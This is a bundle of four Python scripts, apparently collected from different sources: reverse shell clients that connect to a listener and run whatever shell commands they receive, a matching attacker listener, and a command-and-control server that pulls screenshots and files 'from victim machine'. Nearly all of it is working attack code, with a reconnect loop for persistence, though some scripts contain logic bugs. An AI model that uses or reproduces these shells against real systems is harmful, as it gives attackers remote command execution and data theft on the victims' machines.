#!/usr/bin/python

import os
import socket
import subprocess

HOST = '192.168.1.100' # The ip of the listener.
PORT = 4444 # The same port as listener.

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT)) # Connect to listener.
s.send(str.encode("[*] Connection Established!")) # Send connection confirmation.

while 1: # Start loop.
    data = s.recv(1024).decode("UTF-8") # Recieve shell command.
    if data == "quit" or "exit": 
        break # If it's quit, then break out and close socket.
    if data[:2] == "cd":
        os.chdir(data[3:]) # If it's cd, change directory.
    # Run shell command.
    if len(data) > 0:
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
        stdout_value = proc.stdout.read() + proc.stderr.read() # Read output.
        output_str = str(stdout_value, "UTF-8") # Format output.
        currentWD = os.getcwd() + "> " # Get current working directory.
        s.send(str.encode(currentWD + output_str)) # Send output to listener.
    
s.close() # Close socket.


##
##

#!/usr/bin/python3

from socket import *

HOST = '' # '' means bind to all interfaces.
PORT = 4444 #  Port.

s = socket(AF_INET, SOCK_STREAM) # Create our socket handler.
s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1) # Set is so that when we cancel out we can reuse port.
try:
    s.bind((HOST, PORT)) # Bind to interface.
    print("[*] Listening on 0.0.0.0:%s" % str(PORT)) # Print we are accepting connections.
    s.listen(10) # Listen for only 10 unaccepted connections.
    conn, addr = s.accept() # Accept connections.
    print("[+] Connected by", addr) # Print connected by ipaddress.
    data = conn.recv(1024).decode("UTF-8") # Receive initial connection.
    while 1: # Start loop.
        command = input("arm0red> ") # Enter shell command.
        conn.send(bytes(command, "UTF-8")) # Send shell command.
        if command == "quit" or "exit":
            break # If we specify 'quit' or 'exit', then break out of loop and close socket.
        data = conn.recv(1024).decode("UTF-8") # Receive output from command.
        print(data) # Print the output of the command.
except KeyboardInterrupt: 
    print("...listener terminated using [ctrl+c], Shutting down!")
    exit() # Using [ctrl+c] will terminate the listener.
    
conn.close() # Close socket.


##
##


""" 
A simple reverse shell. In order to test the code you will need to run a server to listen to client's port.
You can try netcat command : nc -l -k  [port] (E.g nc -l -k  5002)	
"""


# Set the host and the port.
HOST = "127.0.0.1"
PORT = 5002

def connect((host, port)):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	return s

def wait_for_command(s):
	data = s.recv(1024)
	if data == "quit\n":
		s.close()
		sys.exit(0)
	# the socket died
	elif len(data)==0:
		return True
	else:
		# do shell command
		proc = subprocess.Popen(data, shell=True,
			stdout=subprocess.PIPE, stderr=subprocess.PIPE,
			stdin=subprocess.PIPE)
		stdout_value = proc.stdout.read() + proc.stderr.read()
		s.send(stdout_value)
		return False

def main():
	while True:
		socket_died=False
		try:
			s=connect((HOST,PORT))
			while not socket_died:
				socket_died=wait_for_command(s)
			s.close()
		except socket.error:
			pass
		time.sleep(5)

if __name__ == "__main__":
	import sys,os,subprocess,socket,time
	sys.exit(main())


##
##



#!/usr/bin/python3
import socket
import sys
import datetime
#if you have a public ip then its the perfect one to use otherwise use your
#internal ip and ensure the victim is on the same network
IP_ADDR = 'attackers ip'
PORT = 8000

#create_sock handles our socket connection
def create_sock(ip_addr, serv_port):
    try:
        sock_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock_conn.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock_conn.bind((ip_addr, serv_port))
        sock_conn.listen(5)
        return sock_conn
    except socket.gaierror:
        print("Unable to create connection")
        sys.exit()
    except socket.error:
        print("something went wrong")
        sys.exit()
    except KeyboardInterrupt:
        print("Interrupted by user")
        sys.exit()

    except ConnectionResetError:
        print("Client has disconnected")
        sys.exit()

#the fxn will handle the screenshots and save them using the current time
def screenshot():
    file_name = str(datetime.datetime.now().time())

    file_name = file_name.split(".")[0].replace(":", "-")
    file_name = file_name + '.png'
    with open(file_name, "wb") as f:
        image = client.recv(1024)
        f.write(image)
        while not ("completeServing" in str(image)):
            image = client.recv(1024)
            f.write(image)
#download a file from victim machine
def download(filename):

    with open(filename,"wb") as f:
        content = client.recv(1024)
        f.write(content)
        while not ("completeServing"  in str(content)):
            content = client.recv(1024)
            f.write(content)



def accept_conn(socket_connection):
    client_conn, addr_client = socket_connection.accept()
    return client_conn, addr_client


def perform_task(client_conn):
    while True:
        try:
            command = input(">")
            if not command.split():
                print("enter command")
                continue

            command = str.encode(command)
            client.send(command)
            while True:
                data = client.recv(1024)

                if len(data) > 0:
                    if "uploading" in data.decode("utf-8","replace"):

                        filename = command.decode("utf-8","replace").split(" ")[1]
                        download(filename)

                        continue
                    # while "image" in data.decode("utf-8","replace"):
                    if "image" in data.decode("utf-8", "replace"):
                        screenshot()
                        continue
                    print((data.decode("utf-8", "replace")),end = ' ')
                    if 'done' in data.decode("utf-8", "replace"):
                        break

                    if "exit" in data.decode("utf-8", "replace"):
                        print("\n")
                        sys.exit()
        except KeyboardInterrupt:
            print("Exiting the shell")
            sys.exit()



if __name__ == '__main__':

    sock = create_sock(IP_ADDR, PORT)
    client, addr = accept_conn(sock)
    perform_task(client)


##
##
